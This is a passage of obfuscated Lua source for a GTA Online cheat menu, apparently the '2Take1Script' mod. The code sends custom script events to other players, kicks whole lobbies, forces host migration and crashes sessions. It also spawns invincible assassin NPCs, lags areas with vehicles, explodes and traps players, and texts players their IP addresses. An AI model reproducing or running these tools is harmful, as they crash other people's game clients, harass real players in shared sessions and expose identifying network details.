                        local bq = ped.get_vehicle_ped_is_using(c.ped(i))
                        if bq ~= 0 then
                            I.ctrl(bq)
                            vehicle.set_vehicle_forward_speed(bq, 25)
                            vehicle.set_vehicle_out_of_control(bq, false, true)
                        end
                    end
                end
            end
            l["disablecontrol"] = k.on
            return d.stop(k)
        end
    )
    ak["disablecontrol"].on = l["disablecontrol"]
    ak["modify_veh_speed"] =
        bd(
        "Modify Vehicle Speeds",
        "autoaction_value_i",
        aj["lobby_vehicle"],
        function(k)
            l["modify_veh_speed"] = k.value_i
            local dh = 540
            if l["modify_veh_speed_override"] then
                dh = k.value_i
            end
            for i = 0, 31 do
                if N.i(i, l["modify_veh_speed_include"]) then
                    local bq = ped.get_vehicle_ped_is_using(c.ped(i))
                    if bq ~= 0 then
                        I.ctrl(bq)
                        entity.set_entity_max_speed(bq, dh)
                        vehicle.modify_vehicle_top_speed(bq, k.value_i)
                    end
                end
            end
        end
    )
    ak["modify_veh_speed"].min_i = -500
    ak["modify_veh_speed"].max_i = 1000
    ak["modify_veh_speed"].mod_i = 25
    ak["modify_veh_speed"].value_i = l["modify_veh_speed"]
    bb(
        "Reset Modifies",
        aj["lobby_vehicle"],
        function()
            local dh = 540
            for i = 0, 31 do
                if c.valid(i) then
                    local bq = ped.get_vehicle_ped_is_using(c.ped(i))
                    if bq ~= 0 then
                        I.ctrl(bq)
                        entity.set_entity_max_speed(bq, dh)
                        vehicle.modify_vehicle_top_speed(bq, 0)
                    end
                end
            end
        end
    )
    ak["modify_veh_speed_include"] =
        bc(
        "Include Self & Friends",
        aj["lobby_vehicle"],
        function(k)
            l["modify_veh_speed_include"] = k.on
        end
    )
    ak["modify_veh_speed_include"].on = l["modify_veh_speed_include"]
    ak["modify_veh_speed_overwrite"] =
        bc(
        "Overwrite default Speedlimit",
        aj["lobby_vehicle"],
        function(k)
            l["modify_veh_speed_overwrite"] = k.on
        end
    )
    ak["modify_veh_speed_overwrite"].on = l["modify_veh_speed_overwrite"]
    aj["lobby_bounty"] = b8("Bounty", aj["lobby"]).id
    ak["bounty_after_death"] =
        bd(
        "Set Bounty after Death",
        "value_i",
        aj["lobby_bounty"],
        function(k)
            l["bounty_after_death"] = k.on
            l["bounty_after_death_value"] = k.value_i
            if k.on then
                local dp = 0
                if ak["anonymous_bounty"].on then
                    dp = 1
                end
                for i = 0, 31 do
                    if N.i(i) then
                        if player.get_player_health(i) == 0 then
                            o(K.name(i) .. " is dead!\nSetting bounty...", 33)
                            s(K.name(i) .. " is dead!")
                            s("Setting bounty...")
                            for dg = 0, 31 do
                                if K.scid(dg) ~= -1 then
                                    c.script(
                                        544453591,
                                        dg,
                                        {
                                            69,
                                            i,
                                            1,
                                            ak["bounty_after_death"].value_i,
                                            0,
                                            dp,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            script.get_global_i(1650640 + 9),
                                            script.get_global_i(1650640 + 10)
                                        }
                                    )
                                end
                            end
                            c.wait(1500)
                        end
                    end
                end
            end
            return d.stop(k)
        end
    )
    ak["bounty_after_death"].min_i = 0
    ak["bounty_after_death"].max_i = 10000
    ak["bounty_after_death"].value_i = l["bounty_after_death_value"]
    ak["bounty_after_death"].on = l["bounty_after_death"]
    ak["anonymous_bounty"] =
        bc(
        "Anonymous Bounty",
        aj["lobby_bounty"],
        function(k)
            l["anonymous_bounty"] = k.on
        end
    )
    ak["anonymous_bounty"].on = l["anonymous_bounty"]
    for i = 1, #ad do
        bb(
            ad[i] .. "$",
            aj["lobby_bounty"],
            function()
                local dp = 0
                if ak["anonymous_bounty"].on then
                    dp = 1
                end
                for dg = 0, 31 do
                    if K.scid(dg) ~= -1 then
                        for dq = 0, 31 do
                            if K.scid(dq) ~= -1 then
                                c.script(
                                    544453591,
                                    dq,
                                    {
                                        69,
                                        dg,
                                        1,
                                        ad[i],
                                        0,
                                        dp,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        script.get_global_i(1650640 + 9),
                                        script.get_global_i(1650640 + 10)
                                    }
                                )
                            end
                        end
                    end
                end
            end
        )
    end
    aj["lobby_se"] = b8("Script Events", aj["lobby"]).id
    aj["lobby_se_custom"] = b8("Custom Script Events", aj["lobby_se"]).id
    bb(
        "Enter Custom Script Event with Parameters",
        aj["lobby_se_custom"],
        function()
            local J, dr, ds
            local dt = {}
            J, dr = input.get("Enter Custom SE (DEC)", "", 32, 3)
            while J == 1 do
                c.wait(0)
                J, dr = input.get("Enter Custom SE (DEC)", "", 32, 3)
            end
            if J == 2 then
                o("Aborted sending Custom Event...", 100)
                return HANDLER_POP
            end
            while ds ~= "#" do
                J, ds = input.get("Enter Parameter (DEC), to EXIT and send, enter #", "", 32, 0)
                while J == 1 do
                    c.wait(0)
                    J, ds = input.get("Enter Parameter (DEC), to EXIT and send, enter #", "", 32, 0)
                end
                if J == 2 then
                    o("Aborted sending Custom Event...", 100)
                    return HANDLER_POP
                end
                if ds == "#" then
                    break
                end
                ds = c.no(ds)
                if type(ds) == "number" then
                    dt[#dt + 1] = ds
                else
                    o("Aborted sending Custom Event...", 100)
                    return HANDLER_POP
                end
            end
            for i = 0, 31 do
                if N.i(i) then
                    c.script(dr, i, dt)
                end
            end
            o("Sent Custom Script Event with Parameters to Players.", 100)
        end
    )
    for i = 1, #a5 do
        bb(
            a5[i][1],
            aj["lobby_se_custom"],
            function()
                o("Sent Custom Script Event to Players.", 100)
                for F = 0, 31 do
                    if N.i(F) then
                        for bD = 1, #a5[i][2] do
                            c.script(a5[i][2][bD][1], F, a5[i][2][bD][2])
                        end
                    end
                end
            end
        )
    end
    aj["lobby_send_2_mission"] = b8("Send all to Mission", aj["lobby_se"]).id
    for i = 1, #Q do
        bb(
            "Send to " .. Q[i][1],
            aj["lobby_send_2_mission"],
            function()
                ci(true, 0x692CC4BB, Q[i][2])
                o("Sent Session to Mission")
            end
        )
    end
    aj["lobby_ceo"] = b8("CEO all Player", aj["lobby_se"]).id
    for i = 1, 3 do
        bb(
            R[i][1],
            aj["lobby_ceo"],
            function()
                ci(true, R[i][2], R[i][3], R[i][4], R[i][5])
                o("Modified Players CEO")
            end
        )
    end
    bb(
        "Block - Passive",
        aj["lobby_se"],
        function()
            ci(true, 0x54BAD868, {1, 1})
            o("Blocked all Players from activating Passive.")
        end
    )
    bb(
        "UN-Block - Passive",
        aj["lobby_se"],
        function()
            ci(true, 0x54BAD868, {2, 0})
            o("UN-Blocked all Players from Passive.")
        end
    )
    aj["lobby_sms"] =
        b8(
        "Send SMSs to Lobby",
        aj["lobby"],
        function()
            o("Players must have Voice-Chat enabled to recive SMS.")
        end
    ).id
    bb(
        "Custom SMS input",
        aj["lobby_sms"],
        function()
            local J, du = input.get("Enter Custom SMS", "", 128, 0)
            while J == 1 do
                c.wait(0)
                J, du = input.get("Enter Custom SMS", "", 128, 0)
            end
            if J == 2 then
                return HANDLER_POP
            end
            for i = 0, 31 do
                if N.i(i) then
                    player.send_player_sms(i, du)
                end
            end
        end
    )
    bb(
        "Send SCID & IP",
        aj["lobby_sms"],
        function()
            for i = 0, 31 do
                if N.i(i) then
                    local cH = tostring(K.scid(i))
                    local dj = K.ip(i)
                    player.send_player_sms(i, "R*SCID: " .. cH .. "~n~IP: " .. dj)
                end
            end
        end
    )
    for i = 1, #ae do
        bb(
            ae[i],
            aj["lobby_sms"],
            function()
                for dg = 0, 31 do
                    if N.i(dg) then
                        player.send_player_sms(dg, ae[i])
                    end
                end
            end
        )
    end
    aj["lobby_malicious"] = b8("Malicious", aj["lobby"]).id
    ak["karma_se"] =
        bc(
        "Karma every Script Event",
        aj["lobby_malicious"],
        function(k)
            if b5 == nil then
                b5 = hook.register_script_event_hook(cv)
            else
                hook.remove_script_event_hook(b5)
            end
            l["karma_se"] = k.on
        end
    )
    ak["karma_se"].on = l["karma_se"]
    ak["punish_aliens"] =
        bc(
        "Punish Aliens in Lobby",
        aj["lobby_malicious"],
        function(k)
            l["punish_aliens"] = k.on
            if k.on then
                local time = c.time() + 15000
                while time > c.time() do
                    l["punish_aliens"] = k.on
                    c.wait(150)
                end
                for i = 0, 31 do
                    if N.i(i) then
                        local cy = 0
                        if player.is_player_female(i) then
                            if
                                ped.get_ped_drawable_variation(c.ped(i), 1) == 134 and
                                    (ped.get_ped_texture_variation(c.ped(i), 1) == 8 or
                                        ped.get_ped_texture_variation(c.ped(i), 1) == 9)
                             then
                                cy = cy + 1
                            end
                            if
                                ped.get_ped_drawable_variation(c.ped(i), 4) == 113 and
                                    (ped.get_ped_texture_variation(c.ped(i), 4) == 8 or
                                        ped.get_ped_texture_variation(c.ped(i), 4) == 9)
                             then
                                cy = cy + 1
                            end
                            if
                                ped.get_ped_drawable_variation(c.ped(i), 6) == 87 and
                                    (ped.get_ped_texture_variation(c.ped(i), 6) == 8 or
                                        ped.get_ped_texture_variation(c.ped(i), 6) == 9)
                             then
                                cy = cy + 1
                            end
                            if
                                ped.get_ped_drawable_variation(c.ped(i), 11) == 287 and
                                    (ped.get_ped_texture_variation(c.ped(i), 11) == 8 or
                                        ped.get_ped_texture_variation(c.ped(i), 11) == 9)
                             then
                                cy = cy + 1
                            end
                        else
                            if
                                ped.get_ped_drawable_variation(c.ped(i), 1) == 134 and
                                    (ped.get_ped_texture_variation(c.ped(i), 1) == 8 or
                                        ped.get_ped_texture_variation(c.ped(i), 1) == 9)
                             then
                                cy = cy + 1
                            end
                            if
                                ped.get_ped_drawable_variation(c.ped(i), 4) == 106 and
                                    (ped.get_ped_texture_variation(c.ped(i), 4) == 8 or
                                        ped.get_ped_texture_variation(c.ped(i), 4) == 9)
                             then
                                cy = cy + 1
                            end
                            if
                                ped.get_ped_drawable_variation(c.ped(i), 6) == 83 and
                                    (ped.get_ped_texture_variation(c.ped(i), 6) == 8 or
                                        ped.get_ped_texture_variation(c.ped(i), 6) == 9)
                             then
                                cy = cy + 1
                            end
                            if
                                ped.get_ped_drawable_variation(c.ped(i), 11) == 274 and
                                    (ped.get_ped_texture_variation(c.ped(i), 11) == 8 or
                                        ped.get_ped_texture_variation(c.ped(i), 11) == 9)
                             then
                                cy = cy + 1
                            end
                        end
                        if cy > 1 then
                            s(K.name(i) .. " is a useless alien!")
                            s("Guilty Level: " .. cy)
                            o(K.name(i) .. " is a useless alien! Punishing him!", 23)
                            player.send_player_sms(i, "Delete your stupid alien Outfit!")
                            bL(a7[5][2], i)
                            bL(a7[8][2], i)
                            fire.add_explosion(c.gcoords(c.ped(i)), 59, false, true, 1, c.ped(i))
                            fire.add_explosion(c.gcoords(c.ped(i)), 8, true, false, 1, c.ped(i))
                            fire.add_explosion(c.gcoords(c.ped(i)), 60, true, false, 1, c.ped(i))
                            fire.add_explosion(c.gcoords(c.ped(i)), 8, true, false, 1, c.ped(i))
                        end
                    end
                end
            end
            return d.stop(k)
        end
    )
    ak["punish_aliens"].on = l["punish_aliens"]
    bb(
        "Kick all Players",
        aj["lobby_malicious"],
        function()
            bG(true)
        end
    )
    bb(
        "Host Kick All",
        aj["lobby_malicious"],
        function()
            if network.network_is_host() then
                for i = 0, 31 do
                    if N.i(i) then
                        network.network_session_kick_player(i)
                    end
                end
            else
                o("You are not Session-Host!")
            end
        end
    )
    ak["force_host"] =
        bc(
        "Kick Hosts until You become Host",
        aj["lobby_malicious"],
        function(k)
            if k.on then
                local time = c.time() + 7500
                while time > c.time() do
                    c.wait(250)
                    l["force_host"] = k.on
                end
                local dv = player.get_host()
                if dv ~= c.id() and K.scid(dv) ~= -1 then
                    s("You are not Host!")
                    s(K.name(dv) .. ":" .. K.scid(dv) .. " is Host!")
                    o(K.name(dv) .. " is Host!")
                    bG(false, dv)
                end
            end
            l["force_host"] = k.on
            return d.stop(k)
        end
    )
    ak["force_host"].on = l["force_host"]
    bb(
        "Crash Session",
        aj["lobby_malicious"],
        function()
            s("Crashing Session...")
            c.navigate(false)
            as = entity.get_entity_model_hash(M.ped())
            for i = 1, 11 do
                at[i] = ped.get_ped_texture_variation(M.ped(), i)
            end
            for i = 1, 11 do
                au[i] = ped.get_ped_drawable_variation(M.ped(), i)
            end
            bx(0x471BE4B2, nil, nil, nil, true)
            av = true
            c.wait(5000)
            cn()
            c.navigate(true)
            s("Done.")
        end
    )
    bb("Fix loading screen after Crash", aj["lobby_malicious"], cn)
    if l["2t1s_parent"] then
        aj["opl_parent"] = bf("2Take1Script", 0).id
    end
    bh(
        "Unmark Modder",
        aj["opl_parent"],
        function(k, id)
            if k.on then
                if player.is_player_modder(id, -1) then
                    player.unset_player_as_modder(id, -1)
                end
            end
            return d.stop(k)
        end
    )
    bh(
        "Remote Control Vehicle",
        aj["opl_parent"],
        function(k, dw)
            local dx = menu.get_player_feature(k.id)
            if k.on then
                if aE ~= dw then
                    aE = dw
                    for i = 1, #dx.feats do
                        if i - 1 ~= dw and dx.feats[i].on then
                            dx.feats[i].on = false
                        end
                    end
                end
                local bq = ped.get_vehicle_ped_is_using(c.ped(dw))
                if bq ~= 0 then
                    if aD == nil then
                        local cf = entity.get_entity_model_hash(bq)
                        aD = vehicle.create_vehicle(cf, M.coords(), 0, true, false)
                        ped.set_ped_into_vehicle(M.ped(), aD, -1)
                        c.wait(50)
                    end
                    entity.set_entity_visible(aD, false)
                    if entity.get_entity_attached_to(bq) ~= aD then
                        I.ctrl(aD)
                        entity.set_entity_velocity(aD, v3())
                        bj(aD, c.gcoords(bq))
                        c.wait(0)
                        entity.set_entity_rotation(aD, entity.get_entity_rotation(bq))
                        I.ctrl(bq)
                        entity.set_entity_velocity(bq, v3())
                        entity.set_entity_max_speed(bq, 0)
                        vehicle.set_vehicle_out_of_control(bq, false, false)
                        entity.attach_entity_to_entity(bq, aD, 0, v3(), v3(), true, false, false, 0, true)
                    end
                    return HANDLER_CONTINUE
                else
                    for i = 1, #dx.feats do
                        if dx.feats[i].on then
                            dx.feats[i].on = false
                        end
                    end
                    o("Target is not in a Vehicle!")
                    return HANDLER_POP
                end
            end
            if aD ~= nil then
                ped.clear_ped_tasks_immediately(M.ped())
                bk({aD})
                aD = nil
            end
            return HANDLER_POP
        end
    )
    bg(
        "Repair Vehicle",
        aj["opl_parent"],
        function(k, dw)
            local bq = ped.get_vehicle_ped_is_using(c.ped(dw))
            if bq ~= 0 then
                I.ctrl(bq)
                vehicle.set_vehicle_fixed(bq)
                vehicle.set_vehicle_deformation_fixed(bq)
                vehicle.set_vehicle_can_be_visibly_damaged(bq, false)
                s("Repaired Vehicle.")
            end
        end
    )
    bh(
        "Waypoint Player",
        aj["opl_parent"],
        function(k, dw)
            local dx = menu.get_player_feature(k.id)
            if k.on then
                if aO ~= dw then
                    aO = dw
                    for i = 1, #dx.feats do
                        if i - 1 ~= dw and dx.feats[i].on then
                            dx.feats[i].on = false
                        end
                    end
                end
                local bp = c.gcoords(c.ped(dw))
                ui.set_new_waypoint(v2(bp.x, bp.y))
                c.wait(500)
                return HANDLER_CONTINUE
            end
            c.wait(10)
            ui.set_waypoint_off()
            c.wait(10)
            return HANDLER_POP
        end
    )
    bg(
        "Modify Speed (0-500)",
        aj["opl_parent"],
        function(k, dw)
            local bq = ped.get_vehicle_ped_is_using(c.ped(dw))
            if bq ~= 0 then
                local J, di = input.get("Enter modified Speed (0-500)", "", 10, 3)
                while J == 1 do
                    c.wait(0)
                    J, di = input.get("Enter modified Speed (0-500)", "", 10, 3)
                end
                if J == 2 then
                    return HANDLER_POP
                end
                di = c.no(di)
                if di < 0 or di > 500 then
                    o("Invalid Speed.")
                    return HANDLER_POP
                end
                o("Setting modified Speed.")
                I.ctrl(bq)
                entity.set_entity_max_speed(bq, di)
                vehicle.modify_vehicle_top_speed(bq, di)
            end
        end
    )
    aj["attach"] = bf("Attach Objects", aj["opl_parent"]).id
    bg(
        "Attach Entity from Aim",
        aj["attach"],
        function(k, id)
            local dy = player.get_entity_player_is_aiming_at(c.id())
            if dy ~= 0 then
                bL({{dy, 0, {0, 0, 0}, {0, 0, 0}}}, id, true)
            else
                o("No Entity found. Aim @Entity to attach it to Player.")
            end
        end
    )
    bg(
        "Clear Entitys",
        aj["attach"],
        function()
            s("Clearing Attachments.")
            bk(a0["attach_obj"])
            a0["attach_obj"] = {}
            o("Cleared all Attachment Entitys.")
        end
    )
    for i = 1, #a7 do
        bg(
            a7[i][1],
            aj["attach"],
            function(k, id)
                bL(a7[i][2], id)
            end
        )
    end
    aj["opl_event_logger"] = bf("Log Events", aj["opl_parent"]).id
    bh(
        "Log Script Events",
        aj["opl_event_logger"],
        function(k, id)
            if k.on then
                if aV[id] == nil then
                    aV[id] =
                        hook.register_script_event_hook(
                        function(cp, ca, cq, cr)
                            if cp == id then
                                local cH = K.scid(id)
                                local j = K.name(id)
                                local dz = tostring(cH) .. "-" .. j
                                local e = a["Event-Logger"] .. "\\" .. dz .. "\\" .. "Script-Events.log"
                                local u = d.time_prefix() .. " [Script-Event-Logger]"
                                local f = u
                                if not utils.dir_exists(a["Event-Logger"]) then
                                    utils.make_dir(a["Event-Logger"])
                                end
                                if not utils.dir_exists(a["Event-Logger"] .. "\\" .. dz) then
                                    utils.make_dir(a["Event-Logger"] .. "\\" .. dz)
                                end
                                if not utils.file_exists(e) then
                                    o("Logging to folder '2Take1Script/Event-Logger/" .. dz, 14)
                                    f = "Starting to log Script-Events from Player: " .. j .. ":" .. cH .. "\n" .. u
                                end
                                f = f .. "\n" .. cq[1] .. ", {"
                                for i = 2, #cq do
                                    f = f .. cq[i]
                                    if i ~= #cq then
                                        f = f .. ", "
                                    end
                                end
                                f = f .. "}\n"
                                f = f .. "Parameter count: " .. cr - 1 .. "\n"
                                d.write(c.o(e, "a"), f)
                            end
                        end
                    )
                end
                return HANDLER_CONTINUE
            end
            if not k.on and aV[id] ~= nil then
                hook.remove_script_event_hook(aV[id])
                aV[id] = nil
            end
        end
    )
    bg(
        "Reset Script Event Log",
        aj["opl_event_logger"],
        function(k, id)
            local cH = K.scid(id)
            local j = K.name(id)
            local dz = tostring(cH) .. "-" .. j
            local e = a["Event-Logger"] .. "\\" .. dz .. "\\" .. "Script-Events.log"
            if utils.file_exists(e) then
                os.remove(e)
            else
                o("There was no log to reset.", 14)
            end
        end
    )
    bh(
        "Log Net Events",
        aj["opl_event_logger"],
        function(k, id)
            if k.on then
                if aW[id] == nil then
                    aW[id] =
                        hook.register_net_event_hook(
                        function(cp, ca, cx)
                            if cp == id then
                                local cH = K.scid(id)
                                local j = K.name(id)
                                local dz = tostring(cH) .. "-" .. j
                                local e = a["Event-Logger"] .. "\\" .. dz .. "\\" .. "Net-Events.log"
                                local u = d.time_prefix() .. " [Net-Event-Logger]"
                                local f = u
                                if not utils.dir_exists(a["Event-Logger"]) then
                                    utils.make_dir(a["Event-Logger"])
                                end
                                if not utils.dir_exists(a["Event-Logger"] .. "\\" .. dz) then
                                    utils.make_dir(a["Event-Logger"] .. "\\" .. dz)
                                end
                                if not utils.file_exists(e) then
                                    o("Logging to folder '2Take1Script/Event-Logger/" .. dz, 14)
                                    f = "Starting to log Net-Events from Player: " .. j .. ":" .. cH .. "\n" .. f
                                end
                                local dA = "Unknown Net-Event"
                                if af[cx] ~= nil then
                                    dA = af[cx]
                                end
                                f = f .. "\nEvent: " .. dA .. "\nEvent ID: " .. cx .. "\n"
                                d.write(c.o(e, "a"), f)
                            end
                        end
                    )
                end
                return HANDLER_CONTINUE
            end
            if not k.on and aW[id] ~= nil then
                hook.remove_net_event_hook(aW[id])
                aW[id] = nil
            end
        end
    )
    bg(
        "Reset Net Event Log",
        aj["opl_event_logger"],
        function(k, id)
            local cH = K.scid(id)
            local j = K.name(id)
            local dz = tostring(cH) .. "-" .. j
            local e = a["Event-Logger"] .. "\\" .. dz .. "\\" .. "Net-Events.log"
            if utils.file_exists(e) then
                os.remove(e)
            else
                o("There was no log to reset.", 14)
            end
        end
    )
    aj["opl_se"] = bf("Script-Events", aj["opl_parent"]).id
    aj["opl_se_custom"] = bf("Custom Script Events", aj["opl_se"]).id
    bg(
        "Enter Custom Script Event with Parameters",
        aj["opl_se_custom"],
        function(k, id)
            local J, dr, ds
            local dt = {}
            J, dr = input.get("Enter Custom SE (DEC)", "", 32, 3)
            while J == 1 do
                c.wait(0)
                J, dr = input.get("Enter Custom SE (DEC)", "", 32, 3)
            end
            if J == 2 then
                o("Aborted sending Custom Event...", 93)
                return HANDLER_POP
            end
            while ds ~= "#" do
                J, ds = input.get("Enter Parameter (DEC), to EXIT and send, enter #", "", 32, 0)
                while J == 1 do
                    c.wait(0)
                    J, ds = input.get("Enter Parameter (DEC), to EXIT and send, enter #", "", 32, 0)
                end
                if J == 2 then
                    o("Aborted sending Custom Event...", 93)
                    return HANDLER_POP
                end
                if ds == "#" then
                    break
                end
                ds = c.no(ds)
                if type(ds) == "number" then
                    dt[#dt + 1] = ds
                else
                    o("Aborted sending Custom Event...", 93)
                    return HANDLER_POP
                end
            end
            c.script(dr, id, dt)
            o("Sent Custom Script Event with Parameters to Player.", 93)
        end
    )
    for i = 1, #a5 do
        bg(
            a5[i][1],
            aj["opl_se_custom"],
            function(k, id)
                o("Sent Custom Script Event to Player.", 93)
                for bD = 1, #a5[i][2] do
                    c.script(a5[i][2][bD][1], id, a5[i][2][bD][2])
                end
            end
        )
    end
    bg(
        "Block - Passive",
        aj["opl_se"],
        function(k, id)
            ci(false, 0x54BAD868, {1, 1}, nil, nil, id)
            o("Blocked Player from activating Passive.")
        end
    )
    bg(
        "UN-Block - Passive",
        aj["opl_se"],
        function(k, id)
            ci(false, 0x54BAD868, {2, 0}, nil, nil, id)
            o("UN-Blocked Player from Passive.")
        end
    )
    aj["opl_send_2_mission"] = bf("Send Player to Mission", aj["opl_se"]).id
    for i = 1, #Q do
        bg(
            "Send to " .. Q[i][1],
            aj["opl_send_2_mission"],
            function(k, id)
                ci(false, 0x692CC4BB, Q[i][2], nil, nil, id)
                o("Sent Player to Mission")
            end
        )
    end
    aj["opl_ceo"] = bf("CEO", aj["opl_se"]).id
    for i = 1, 3 do
        bg(
            R[i][1],
            aj["opl_ceo"],
            function(k, id)
                ci(false, R[i][2], R[i][3], R[i][4], R[i][5], id)
                o("Modified Players CEO")
            end
        )
    end
    aj["opl_assassins_peds"] = bf("Send PEDs (Assassins)", aj["opl_parent"]).id
    bg(
        "Clear PEDs",
        aj["opl_assassins_peds"],
        function()
            bk(a0["peds"])
            a0["peds"] = {}
        end
    )
    for i = 1, #a4 do
        bg(
            "Spawn " .. a4[i][1] .. " (3x)",
            aj["opl_assassins_peds"],
            function(k, id)
                s("Spawning PEDs.")
                aF = id
                local cf = a4[i][2]
                local dB = a4[i][3]
                local bp = v3()
                I.model(cf)
                for i = 1, 3 do
                    bp = c.gcoords(c.ped(id))
                    bp.x = bp.x + c.random(-10, 10)
                    bp.y = bp.y + c.random(-10, 10)
                    a0["peds"][#a0["peds"] + 1] = ped.create_ped(dB, cf, bp, 0.0, true, false)
                    if dB ~= 28 then
                        weapon.give_delayed_weapon_to.ped(a0["peds"][#a0["peds"]], 0xDBBD7280, 0, 0)
                    end
                    ped.set_ped_max_health(a0["peds"][#a0["peds"]], 25000000.0)
                    ped.set_ped_health(a0["peds"][#a0["peds"]], 25000000.0)
                    ped.set_ped_combat_attributes(a0["peds"][#a0["peds"]], 46, true)
                    ped.set_ped_combat_ability(a0["peds"][#a0["peds"]], 2)
                    ped.set_ped_config_flag(a0["peds"][#a0["peds"]], 187, 0)
                    ped.set_ped_can_ragdoll(a0["peds"][#a0["peds"]], false)
                    for dg = 1, 26 do
                        ped.set_ped_ragdoll_blocking_flags(a0["peds"][#a0["peds"]], dg)
                    end
                    ai.task_combat_ped(a0["peds"][#a0["peds"]], c.ped(id), 0, 16)
                end
                c.unload(cf)
                s("Done.")
            end
        )
    end
    bg(
        "TP to Player",
        aj["opl_parent"],
        function(k, id)
            bm(c.gcoords(c.ped(id)), 3)
        end
    )
    bg(
        "TP Players Vehicle to me",
        aj["opl_parent"],
        function(k, id)
            local bq = ped.get_vehicle_ped_is_using(c.ped(id))
            I.ctrl(bq)
            entity.set_entity_velocity(bq, v3())
            bj(bq, M.coords())
        end
    )
    bg(
        "Add Player to Blacklist",
        aj["opl_parent"],
        function(k, id)
            local cH = K.scid(id)
            if cH == K.scid(c.id()) or cH == -1 then
                o("Choose valid Player.")
            else
                d.write(c.o(b["Blacklist"], "a"), cH .. " " .. K.name(id))
                o("Player " .. K.name(id) .. " added to Blocklist.", 48)
                s("Player " .. K.name(id) .. " with SCID: " .. cH .. " added to Blacklist.")
            end
        end
    )
    aj["opl_misc"] = bf("Miscellaneous", aj["opl_parent"]).id
    aj["opl_sms"] =
        bf(
        "Send SMSs to Player",
        aj["opl_misc"],
        function()
            o("Player must have Voice-Chat enabled to recive SMS.")
        end
    ).id
    bg(
        "Custom SMS input",
        aj["opl_sms"],
        function(k, id)
            local J, du = input.get("Enter Custom SMS", "", 128, 0)
            while J == 1 do
                c.wait(0)
                J, du = input.get("Enter Custom SMS", "", 128, 0)
            end
            if J == 2 then
                return HANDLER_POP
            end
            player.send_player_sms(id, du)
        end
    )
    bg(
        "Send his SCID & IP",
        aj["opl_sms"],
        function(k, id)
            local cH = tostring(K.scid(id))
            local dj = K.ip(id)
            player.send_player_sms(id, "R*SCID: " .. cH .. "~n~IP: " .. dj)
        end
    )
    for i = 1, #ae do
        bg(
            ae[i],
            aj["opl_sms"],
            function(k, id)
                player.send_player_sms(id, ae[i])
            end
        )
    end
    bg(
        "Falling Asteroids",
        aj["opl_misc"],
        function(k, id)
            c.navigate(false)
            local bp = v3()
            local dC
            I.model(3751297495)
            for i = 1, 25 do
                bp = c.gcoords(c.ped(id))
                bp.x = c.random(math.floor(bp.x - 80), math.floor(bp.x + 80))
                bp.y = c.random(math.floor(bp.y - 80), math.floor(bp.y + 80))
                bp.z = bp.z + c.random(45, 90)
                dC = c.random(-125, 25)
                a0["asteroids"][#a0["asteroids"] + 1] = object.create_object(3751297495, bp, true, true)
                entity.apply_force_to_entity(a0["asteroids"][#a0["asteroids"]], 3, 0, 0, dC, 0, 0, 0, true, true)
            end
            c.unload(3751297495)
            for i = 1, 5 do
                for i = 1, 25 do
                    bp = c.gcoords(a0["asteroids"][#a0["asteroids"] - 25 + i])
                    fire.add_explosion(bp, 8, true, false, 0, 0)
                    c.wait(50)
                end
            end
            c.navigate(true)
        end
    )
    bg(
        "Delete Asteroids",
        aj["opl_misc"],
        function()
            s("Clearing Asteroids.")
            bk(a0["asteroids"])
            a0["asteroids"] = {}
            o("Cleared all Asteroids.")
        end
    )
    bg(
        "Apply random Force to Player",
        aj["opl_misc"],
        function(k, id)
            local dD = c.ped(id)
            if ped.is_ped_in_any_vehicle(dD) then
                dD = ped.get_vehicle_ped_is_using(dD)
            else
                o("It works better, if target is in a Vehicle.")
            end
            I.ctrl(dD)
            local dE = entity.get_entity_velocity(dD)
            for i = 1, 5 do
                dE.x = c.random(math.floor(dE.x - 50), math.floor(dE.x + 50))
                dE.y = c.random(math.floor(dE.y - 50), math.floor(dE.y + 50))
                dE.z = c.random(math.floor(dE.z - 50), math.floor(dE.z + 50))
                entity.set_entity_velocity(dD, dE)
                c.wait(10)
            end
        end
    )
    bg(
        "Trap in Stunt Tube",
        aj["opl_misc"],
        function(k, id)
            local bp = c.gcoords(c.ped(id))
            bp.z = bp.z - 5
            entity.set_entity_rotation(object.create_object(1125864094, bp, true, false), v3(0, 90, 0))
        end
    )
    bg(
        "Trap in invisible Cage",
        aj["opl_misc"],
        function(k, id)
            local bp = c.gcoords(c.ped(id))
            bp.x = bp.x + 1.24
            bp.y = bp.y + 0.24
            I.model(401136338)
            local dF = object.create_object(401136338, bp, true, false)
            entity.set_entity_visible(dF, false)
            entity.set_entity_rotation(dF, v3(0, -90, 0))
            entity.freeze_entity(dF, true)
            bp = c.gcoords(c.ped(id))
            bp.x = bp.x + 0.02
            bp.y = bp.y + 0.82
            dF = object.create_object(401136338, bp, true, false)
            entity.set_entity_visible(dF, false)
            entity.set_entity_rotation(dF, v3(90, -90, 0))
            entity.freeze_entity(dF, true)
            c.unload(401136338)
        end
    )
    aj["opl_bounty"] = bf("Bounty", aj["opl_parent"]).id
    for i = 1, #ad do
        bg(
            ad[i] .. "$",
            aj["opl_bounty"],
            function()
                local dp = 0
                if ak["anonymous_bounty"].on then
                    dp = 1
                end
                for dg = 0, 31 do
                    if K.scid(dg) ~= -1 then
                        c.script(
                            544453591,
                            dg,
                            {
                                69,
                                id,
                                1,
                                ad[i],
                                0,
                                dp,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                script.get_global_i(1650640 + 9),
                                script.get_global_i(1650640 + 10)
                            }
                        )
                    end
                end
            end
        )
    end
    aj["opl_lag_area"] =
        bf(
        "Lag Area with Vehicles",
        aj["opl_parent"],
        function()
            o("DANGEROUS! ONLY USE WITH CAUTION!", 208)
        end
    ).id
    for i = 1, #a9 do
        bg(
            "Lag / Rain Area with " .. a9[i][1],
            aj["opl_lag_area"],
            function(k, id)
                bS(id, a9[i][2])
            end
        )
    end
    bg(
        "Delete Vehicles",
        aj["opl_lag_area"],
        function()
            s("Clearing Vehicles.")
            bk(a0["lag_area"])
            a0["lag_area"] = {}
            o("Cleared Vehicles.")
        end
    )
    aj["opl_malicious"] = bf("Malicious (Kick / Crash)", aj["opl_parent"]).id
    bg(
        "Kick Player",
        aj["opl_malicious"],
        function(k, id)
            bG(false, id)
        end
    )
    bg(
        "Host Kick Player",
        aj["opl_malicious"],
        function(k, id)
            if network.network_is_host() then
